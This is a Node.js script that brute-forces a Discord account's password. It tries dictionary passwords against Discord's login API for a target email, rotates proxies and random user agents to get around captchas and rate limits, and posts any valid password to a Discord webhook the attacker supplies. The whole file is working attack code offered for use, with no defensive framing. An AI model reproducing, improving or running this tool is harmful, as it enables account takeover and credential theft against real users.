//Dependencies
const Random_UserAgent = require("random-useragent")
const ProXie = require("./ProXie/index")
const Discord = require("discord.js")
const Is_Email = require("is-email")
const Request = require("request")
const Delay = require("delay")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

const Dictionary = Fs.readFileSync("./dictionary.txt", "utf8").split("\n")

//Main
if(Dictionary.length-1 == 0){
    console.log("No passwords found on the dictionary.")
    process.exit()
}

if(Self_Args.length == 0){
    console.log(`node index.js <email> <webhook_link>
Example: node example@gmail.com yourwebhooklink`)
    process.exit()
}

if(Self_Args[0] == ""){
    console.log("Invalid email.")
    process.exit()
}

if(!Is_Email(Self_Args[0])){
    console.log("Invalid email.")
    process.exit()
}

if(Self_Args[1] == ""){
    console.log("Invalid webhook_link.")
    process.exit()
}

const Webhook = new Discord.WebhookClient(Self_Args[1].split("/").length-2, Self_Args[1].split("/").length-1)

var dictionary_index = 0

Init()

async function Init(){
    await ProXie.init()

    const Proxies = ProXie.get()

    for( i = 0; i <= Dictionary.length-1; i++ ){
        Check(Proxies, i+1)
    }
}

async function Check(proxies, proxy_index){
    await Delay(100)

    Request.post("https://discord.com/api/v9/auth/login", {
        headers: {
            "Content-Type": "application/json",
            "Authorization": undefined,
            "User-Agent": Random_UserAgent.getRandom(),
            "Referer": "https://discord.com/login",
            "x-debug-options": "bugReporterEnabled",
        },
        body: JSON.stringify({ "login": Self_Args[0], "password": Dictionary[dictionary_index], "undelete": false, "captcha_key": null, "login_source": null, "gift_code_sku_id": null }),
        proxy: `http://${proxies[proxy_index]}`
    }, function(err, res, body){
        if(err){
            if(proxies.length == proxy_index){
                proxy_index = 0

                Check(proxies, proxy_index+1)
                return
            }else{
                Check(proxies, proxy_index+1)
            }
            return
        }
        
        if(body.indexOf('"captcha_key": ["') != -1){
            if(proxies.length == proxy_index){
                proxy_index = 0

                Check(proxies, proxy_index+1)
                return
            }else{
                Check(proxies, proxy_index+1)
            }
            return
        }

        if(body.indexOf('"token": "') != -1){
            console.log(`Valid password: ${Dictionary[dictionary_index]}`)
            Webhook.send(`Valid password: ${Dictionary[dictionary_index]}`)
        }else{
            console.log(`Invalid password: ${Dictionary[dictionary_index]}`)
        }

        if(dictionary_index == Dictionary.length-1){
            console.log("Bruteforcing is done.")
            process.exit()
        }
    })
}
